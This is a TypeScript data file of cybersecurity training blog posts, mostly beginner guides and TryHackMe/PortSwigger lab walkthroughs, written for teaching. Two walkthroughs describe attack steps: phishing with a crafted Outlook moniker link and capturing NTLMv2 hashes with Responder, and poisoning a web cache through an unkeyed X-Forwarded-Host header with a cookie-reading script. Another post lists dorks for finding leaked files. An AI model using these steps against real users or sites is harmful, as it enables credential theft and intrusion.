export interface BlogPost {
  slug: string;
  title: string;
  category: string;
  image: string;
  desc: string;
  readTime: string;
  content: {
    intro: string;
    sections: {
      heading: string;
      body: string[];
    }[];
    conclusion: string;
  };
}

export const blogs: BlogPost[] = [
  {
    slug: "best-laptops-for-cybersecurity-training-in-2025",
    title: "Best Laptops for Cybersecurity Training in 2025",
    category: "Generic",
    image: "https://cyberiumx.com/wp-content/uploads/2025/07/PortSwigger-1.jpg",
    desc: "If you’re planning to build a career in cybersecurity, your laptop is one of the most important tools you’ll invest in. Whether you're running Kali Linux, multiple VMs, or packet decoders, here is the ultimate curated hardware guide.",
    readTime: "7 min read",
    content: {
      intro: "Entering cybersecurity requires capable computing hardware. Whether you are running virtualized networks in VirtualBox/VMware, compiling penetration testing exploits, simulating Active Directory domains, or cracking hashes with Hashcat, choosing the right machine makes a significant difference.",
      sections: [
        {
          heading: "Key Hardware Specifications to Look For",
          body: [
            "RAM (Memory): Minimum 16GB is non-negotiable. 32GB is strongly recommended if you plan to run an attacker VM (Kali Linux) alongside target VMs (Windows Server, Ubuntu) simultaneously.",
            "Processor (CPU): Aim for at least an Intel Core i7 (12th Gen+) or AMD Ryzen 7 (5000/6000/7000 series). A higher core count enables dedicated core allocations per virtual machine.",
            "Storage: Fast NVMe SSDs with at least 1TB capacity. VMs and lab snapshots take up massive space quickly.",
            "Dedicated GPU: Optional for beginner ethical hacking, but crucial if you want to explore password hash recovery or local machine learning security analysis."
          ]
        },
        {
          heading: "Top Laptop Recommendations in 2025",
          body: [
            "1. Lenovo ThinkPad T14 / P14s: Renowned keyboard durability, exceptional Linux driver compatibility, and upgradable RAM options.",
            "2. Dell XPS 15: Outstanding 14-core Intel processing power, gorgeous display, and powerful multitasking support.",
            "3. Apple MacBook Pro (M2/M3 Pro/Max): Unrivaled battery life and UNIX-based macOS foundation. Note: ARM architecture requires ARM-based Linux VMs (Kali Linux ARM).",
            "4. ASUS ROG Zephyrus G14: Great hybrid machine balancing raw multicore Ryzen power, RTX dedicated GPU for hash cracking, and portable form factor."
          ]
        },
        {
          heading: "Operating System Strategy",
          body: [
            "We recommend keeping Windows 11 Pro or macOS as your host OS, and running your penetration testing environments (Kali Linux, Parrot OS, REMnux) inside Type-2 hypervisors like VMware Workstation Pro or VirtualBox for safety and snapshot rollback capabilities."
          ]
        }
      ],
      conclusion: "Invest in high RAM and CPU cores first before focusing on aesthetics. A reliable machine will serve you well through certifications like CEH, CCNA, and OSCP+."
    }
  },
  {
    slug: "how-to-build-a-cybersecurity-lab-at-home",
    title: "How to Build a Cybersecurity Lab at Home",
    category: "Generic",
    image: "https://cyberiumx.com/wp-content/uploads/2025/07/PortSwigger.jpg",
    desc: "Practical hands-on experience is essential for any ethical hacker. Learn how to design and build an isolated, cost-effective home lab for network defense and pentesting.",
    readTime: "8 min read",
    content: {
      intro: "Reading theoretical concepts only gets you halfway. Real cybersecurity mastery comes from breaking and defending actual systems. In this guide, we break down how to set up an isolated home hacking lab without putting your personal network at risk.",
      sections: [
        {
          heading: "Step 1: Hypervisor Setup & Network Isolation",
          body: [
            "Install VMware Workstation or Oracle VirtualBox on your primary host.",
            "Create a dedicated Host-Only or Internal NAT Network. This ensures that vulnerable target machines cannot route outbound traffic or infect your home Wi-Fi network."
          ]
        },
        {
          heading: "Step 2: Deploying Attack and Defense Systems",
          body: [
            "Attacker Machine: Download the official Kali Linux or Parrot Security Virtual Appliance.",
            "Vulnerable Targets: Download pre-built practice targets like Metasploitable 2/3, OWASP Juice Shop, and DVWA (Damn Vulnerable Web App).",
            "Active Directory Lab: Spin up a Windows Server 2022 trial alongside two Windows 10/11 enterprise clients to practice Kerberoasting, Pass-the-Hash, and domain privilege escalation."
          ]
        },
        {
          heading: "Step 3: Incorporating a Dedicated SIEM",
          body: [
            "To understand both sides (Red Team and Blue Team), forward your Windows security event logs and Linux syslogs to a centralized SIEM instance such as Splunk Free or Wazuh. Observe what your attacks look like from a defensive perspective."
          ]
        }
      ],
      conclusion: "Building a home lab costs zero dollars using free trials and community editions. Spend an hour setting this up, and your practical offensive and defensive skills will skyrocket."
    }
  },
  {
    slug: "tryhackme-answers-for-cyberchef-the-basics",
    title: "TryHackMe | Answers for CyberChef: The Basics",
    category: "TryHackMe",
    image: "https://cyberiumx.com/wp-content/uploads/2024/11/CyberChef-_-The-Basics.jpg",
    desc: "In this walkthrough, we cover concepts and step-by-step solutions for the 'CyberChef: The Basics' room on TryHackMe, part of the Cyber Security 101 learning path.",
    readTime: "5 min read",
    content: {
      intro: "CyberChef is the Swiss Army knife for cybersecurity analysts, malware reverse engineers, and CTF players. This guide walks through the essential recipes and tasks found in the TryHackMe CyberChef room.",
      sections: [
        {
          heading: "Understanding the CyberChef Interface",
          body: [
            "Input: Where raw data (text, hex, base64 strings, file binaries) is pasted.",
            "Recipe: The sequence of transformations applied in sequential order.",
            "Output: The transformed result displayed in real time.",
            "Auto Bake: Automatically recomputes output whenever input or recipe parameters change."
          ]
        },
        {
          heading: "Key Recipes & Room Walkthrough",
          body: [
            "Task: Decoding Base64 strings. Recipe: Add 'From Base64'.",
            "Task: Converting decimal to binary numbers. Recipe: Add 'To Binary' with appropriate delimiter settings.",
            "Task: Unix Timestamp conversion. Recipe: Add 'From UNIX Timestamp' to convert epoch seconds into readable UTC timestamps.",
            "Task: Extracting URLs and IP addresses. Recipe: Use 'Extract IP Addresses' and 'Extract URLs' to automatically parse indicators of compromise (IOCs) from dirty log dumps."
          ]
        }
      ],
      conclusion: "CyberChef saves hours of manual scripting when analyzing obfuscated strings, malware payloads, and network artifacts."
    }
  },
  {
    slug: "tryhackme-answers-for-training-impact-on-teams",
    title: "TryHackMe | Answers for Training Impact on Teams",
    category: "TryHackMe",
    image: "https://cyberiumx.com/wp-content/uploads/2024/11/TrainingImpactonteams.jpg",
    desc: "Understand cybersecurity ROI, team ramp-up metrics, and explore solutions for the 'Training Impact on Teams' room.",
    readTime: "4 min read",
    content: {
      intro: "Organizations often struggle with the cybersecurity skills gap. This room demonstrates the measurable impact of hands-on technical training on enterprise security teams.",
      sections: [
        {
          heading: "Training ROI & Productivity Metrics",
          body: [
            "Upskilling vs. Hiring: Ramping up existing employees through continuous labs cuts security onboarding costs by up to 60%.",
            "Mean Time to Detect (MTTD) & Respond (MTTR): Teams that regularly conduct red/blue team simulations resolve real incidents significantly faster.",
            "Custom Learning Paths: Tailoring paths to specific cloud, SOC, and penetration testing roles produces higher engagement and credential retention."
          ]
        }
      ],
      conclusion: "Structured hands-on practice builds proactive defense capabilities rather than passive compliance."
    }
  },
  {
    slug: "tryhackme-answers-for-soc-fundamentals",
    title: "TryHackMe | Answers for SOC Fundamentals",
    category: "TryHackMe",
    image: "https://cyberiumx.com/wp-content/uploads/2024/11/SOC-Fundamentals.jpg",
    desc: "A comprehensive guide to SOC operations, SIEM alerts, triage tiers, and solutions for the TryHackMe SOC Fundamentals room.",
    readTime: "6 min read",
    content: {
      intro: "Security Operations Centers (SOCs) are the frontline guardians of enterprise digital infrastructure. This guide covers the operational principles and task solutions for the SOC Fundamentals module.",
      sections: [
        {
          heading: "SOC Operational Tiers",
          body: [
            "Tier 1 (Triage Analyst): Monitors SIEM alerts 24/7, filters false positives, and escalates true security incidents.",
            "Tier 2 (Incident Responder): Conducts deep forensic analysis, scopes the blast radius, and applies containment actions.",
            "Tier 3 (Threat Hunter / Lead): Proactively searches for advanced persistent threats (APTs) residing silently within the network."
          ]
        },
        {
          heading: "Core Technologies Examined",
          body: [
            "SIEM (Security Information & Event Management): Aggregates and correlates logs across firewalls, endpoints, and identity providers.",
            "EDR (Endpoint Detection & Response): Provides continuous host monitoring, memory inspection, and isolation controls.",
            "SOAR (Security Orchestration, Automation & Response): Automates playbook execution to neutralize common phishing or brute force attacks."
          ]
        }
      ],
      conclusion: "Mastering the triage workflow is foundational for landing entry-level SOC Analyst roles."
    }
  },
  {
    slug: "tryhackme-answers-for-web-application-basics",
    title: "TryHackMe | Answers for Web Application Basics",
    category: "TryHackMe",
    image: "https://cyberiumx.com/wp-content/uploads/2024/10/Web-Application-Basics.png",
    desc: "Master HTTP request-response cycles, headers, cookies, and status codes with this walkthrough of Web Application Basics.",
    readTime: "5 min read",
    content: {
      intro: "Web penetration testing requires deep familiarity with how browsers communicate with web servers. Here is everything you need to understand HTTP mechanics and ace the Web Application Basics room.",
      sections: [
        {
          heading: "HTTP Request Structure",
          body: [
            "Method: GET, POST, PUT, DELETE, OPTIONS, HEAD.",
            "Target URI: The resource endpoint path.",
            "Host Header: Specifies the target domain name (vital for virtual host routing).",
            "User-Agent & Content-Type: Identifies client software and payload MIME formats."
          ]
        },
        {
          heading: "HTTP Response Status Codes",
          body: [
            "200 OK: Successful request.",
            "301 / 302: Redirections.",
            "401 Unauthorized / 403 Forbidden: Authentication and authorization failures.",
            "404 Not Found: Resource does not exist.",
            "500 Internal Server Error: Server unhandled exception (prime target for bug hunters)."
          ]
        }
      ],
      conclusion: "Web application security begins with inspecting every raw HTTP header using tools like Burp Suite or OWASP ZAP."
    }
  },
  {
    slug: "tryhackme-answers-for-moniker-link-cve-2024-21413",
    title: "TryHackMe | Answers for Moniker Link (CVE-2024-21413)",
    category: "TryHackMe",
    image: "https://cyberiumx.com/wp-content/uploads/2024/10/Moniker-Link-CVE-2024-21413.png",
    desc: "Technical deep-dive into Microsoft Outlook's CVE-2024-21413 Moniker Link flaw allowing remote NTLM hash leakage and RCE risks.",
    readTime: "7 min read",
    content: {
      intro: "CVE-2024-21413 (also known as the Moniker Link bug) is a critical CVSS 9.8 vulnerability affecting Microsoft Outlook that bypassed Protected View security warnings.",
      sections: [
        {
          heading: "Vulnerability Mechanics",
          body: [
            "Outlook uses the MkParseDisplayName API to handle custom URL schemes such as file:// and ms-msdt.",
            "By prepending the exclamation mark '!' to the end of a remote file URI (e.g. file:///\\\\attacker-ip\\share\\file.rtf!something), Outlook fails to trigger security warnings.",
            "When the victim clicks the hyperlink, the host sends an SMB negotiation request containing the victim's NTLMv2 password hash directly to the attacker's server."
          ]
        },
        {
          heading: "Exploitation & Capture Walkthrough",
          body: [
            "Run Responder on the attacker machine: responder -I eth0 -v.",
            "Craft the phishing email containing the crafted moniker link hyperlink.",
            "Observe incoming NTLMv2 hash captures on Responder, ready for offline cracking with Hashcat."
          ]
        }
      ],
      conclusion: "Mitigate this threat by disabling outbound SMB (port 445) at the perimeter firewall and applying official Microsoft security patches."
    }
  },
  {
    slug: "tryhackme-answers-for-cryptography-basics",
    title: "TryHackMe | Answers For Cryptography Basics",
    category: "TryHackMe",
    image: "https://cyberiumx.com/wp-content/uploads/2024/10/Cryptography-Basics.jpg",
    desc: "Learn encryption primitives, hashing algorithms, digital signatures, and answers for the TryHackMe Cryptography Basics room.",
    readTime: "6 min read",
    content: {
      intro: "Cryptography is the bedrock of modern communications security, protecting confidentiality, integrity, authentication, and non-repudiation.",
      sections: [
        {
          heading: "Symmetric vs. Asymmetric Encryption",
          body: [
            "Symmetric: Uses a single secret key for both encryption and decryption (e.g., AES-256, ChaCha20). Fast and optimal for bulk data transfer.",
            "Asymmetric: Uses a public key for encryption and a private key for decryption (e.g., RSA-4096, ECC). Used for secure key exchange and digital signatures."
          ]
        },
        {
          heading: "Hashing vs. Encryption",
          body: [
            "Hashing is a one-way deterministic mathematical function (SHA-256, bcrypt). It cannot be decrypted back into original plaintext.",
            "Encryption is a two-way process designed to be decrypted with the proper secret key."
          ]
        }
      ],
      conclusion: "Never roll your own crypto—always rely on vetted, industry-standard cryptographic libraries."
    }
  },
  {
    slug: "tryhackme-answers-for-networking-concepts",
    title: "TryHackMe | Answers For Networking Concepts",
    category: "TryHackMe",
    image: "https://cyberiumx.com/wp-content/uploads/2024/10/Networking-Concepts.jpg",
    desc: "Complete walkthrough of the TCP/IP stack, OSI model, subnetting fundamentals, and solutions for the Networking Concepts room.",
    readTime: "6 min read",
    content: {
      intro: "You cannot defend or penetrate a network without understanding how packets travel across switches, routers, and firewalls. Here is the breakdown for the Networking Concepts module.",
      sections: [
        {
          heading: "OSI 7-Layer Model Reference",
          body: [
            "Layer 7 (Application): HTTP, DNS, SSH, FTP.",
            "Layer 4 (Transport): TCP (reliable, connection-oriented) & UDP (fast, connectionless).",
            "Layer 3 (Network): IP addressing, routing, ICMP.",
            "Layer 2 (Data Link): MAC addressing, Ethernet switches, ARP.",
            "Layer 1 (Physical): Cables, fiber optics, radio frequencies."
          ]
        },
        {
          heading: "Private vs. Public IP Ranges (RFC 1918)",
          body: [
            "10.0.0.0 – 10.255.255.255 (Class A)",
            "172.16.0.0 – 172.31.255.255 (Class B)",
            "192.168.0.0 – 192.168.255.255 (Class C)"
          ]
        }
      ],
      conclusion: "Networking fundamentals are mandatory prerequisites for CCNA, CEH, and OSCP+ certifications."
    }
  },
  {
    slug: "tryhackme-answers-for-windows-command-line",
    title: "TryHackMe | Answers For Windows Command Line",
    category: "TryHackMe",
    image: "https://cyberiumx.com/wp-content/uploads/2024/10/Windows-Command-Line.jpg",
    desc: "Essential CMD commands for ethical hackers, administrative navigation, and task walkthroughs for the Windows Command Line room.",
    readTime: "5 min read",
    content: {
      intro: "Windows powers over 80% of enterprise endpoints and servers. Knowing how to query system telemetry and manage processes via the Windows Command Prompt is an indispensable skill.",
      sections: [
        {
          heading: "Essential Administrative Commands",
          body: [
            "whoami /all: Displays current user SID, assigned privileges (e.g. SeImpersonatePrivilege), and group memberships.",
            "netstat -ano: Lists all active TCP/UDP connections along with listening ports and corresponding Process IDs (PIDs).",
            "tasklist & taskkill /PID <num> /F: Enumerates running processes and terminates rogue services.",
            "ipconfig /all & arp -a: Gathers IP configuration, DNS servers, and cached MAC-to-IP local mappings."
          ]
        }
      ],
      conclusion: "Mastering the native command prompt allows you to operate swiftly during initial post-exploitation assessments."
    }
  },
  {
    slug: "tryhackme-answers-for-search-skills",
    title: "TryHackMe | Answers For Search Skills",
    category: "TryHackMe",
    image: "https://cyberiumx.com/wp-content/uploads/2024/10/Search-Skills.jpg",
    desc: "Master Google dorking, open-source intelligence (OSINT), CVE indexing, and room answers for Search Skills.",
    readTime: "5 min read",
    content: {
      intro: "The best hackers are world-class researchers. Google Dorking and OSINT intelligence gathering let you uncover critical misconfigurations before touching the target system.",
      sections: [
        {
          heading: "Advanced Search Operators (Google Dorks)",
          body: [
            "site:target.com: Restricts search strictly to subdomains and pages of the specified target.",
            "filetype:pdf, filetype:env, filetype:sql: Finds leaked sensitive configuration files or database backups.",
            "inurl:admin or intitle:\"Dashboard\": Discovers hidden login portals and administrative interfaces."
          ]
        },
        {
          heading: "CVE & Exploit Databases",
          body: [
            "NVD (National Vulnerability Database): Authoritative source for Common Vulnerabilities and Exposures (CVEs) and CVSS metrics.",
            "Exploit-DB: Curated repository of publicly verified exploit proofs-of-concept."
          ]
        }
      ],
      conclusion: "Effective search skills dramatically shorten the reconnaissance phase of ethical security assessments."
    }
  },
  {
    slug: "portswigger-web-cache-poisoning-with-an-unkeyed-header",
    title: "PortSwigger - Web Cache Poisoning With An Unkeyed Header",
    category: "PortSwigger",
    image: "https://cyberiumx.com/wp-content/uploads/2024/10/Web-cache-poisoning-with-an-unkeyed-header.png",
    desc: "In-depth guide and exploit steps for PortSwigger Web Security Academy's Web Cache Poisoning With An Unkeyed Header lab.",
    readTime: "8 min read",
    content: {
      intro: "Web cache poisoning is an advanced exploit technique where an attacker manipulates a caching proxy into serving malicious, poisoned responses to unsuspecting visitors.",
      sections: [
        {
          heading: "What is an Unkeyed Header?",
          body: [
            "Caches determine if two requests are identical using a 'Cache Key' (typically the HTTP Method and Request Path).",
            "Headers not included in the cache key are called 'unkeyed headers' (such as X-Forwarded-Host or X-Host).",
            "If the backend application reflects the value of an unkeyed header into the rendered HTML page without sanitization, the cached copy is poisoned for all subsequent users."
          ]
        },
        {
          heading: "Step-by-Step Lab Solution",
          body: [
            "1. Intercept a GET request to the root path '/' using Burp Suite.",
            "2. Add the unkeyed header: X-Forwarded-Host: <your-exploit-server-domain>.",
            "3. On your exploit server, create an exploit file matching the tracking JavaScript resource: /resources/js/tracking.js containing: alert(document.cookie).",
            "4. Send the poisoned request to the target site until you receive an HTTP response with header: 'X-Cache: hit'.",
            "5. When victim users visit the home page, their browser executes your injected JavaScript from the poisoned cache."
          ]
        }
      ],
      conclusion: "Always validate that caching proxies either include all reflected headers in the cache key or strip untrusted reverse proxy headers completely."
    }
  }
];
